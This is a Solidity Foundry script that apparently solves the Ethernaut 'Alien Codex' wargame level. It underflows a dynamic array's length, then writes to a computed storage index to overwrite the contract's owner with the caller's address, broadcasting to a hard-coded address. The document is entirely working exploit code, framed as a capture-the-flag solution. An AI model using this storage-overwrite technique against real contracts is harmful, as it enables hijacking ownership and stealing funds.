// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IAlienCodex {
    function contact() external view returns (bool);
    function make_contact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
    function owner() external view returns (address);
}

contract AlienCodexSolution is Script {
    function run() external {
        uint deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address alienCodexAddress = 0x9A5589128908441ae5181953193Ca6585F43C3D5;

        vm.startBroadcast(deployerPrivateKey);

        IAlienCodex alien = IAlienCodex(alienCodexAddress);

        // Only call make_contact if contact is false
        if (!alien.contact()) {
            alien.make_contact();
        }

        // Trigger array underflow
        alien.retract();

        // Compute index to overwrite owner
        uint256 arraySlot = uint256(keccak256(abi.encode(uint256(2))));
        uint256 index = type(uint256).max - arraySlot + 1;

        // Overwrite owner with our address
        alien.revise(index, bytes32(uint256(uint160(msg.sender))));

        console.log("New owner:", alien.owner());

        vm.stopBroadcast();
    }
}
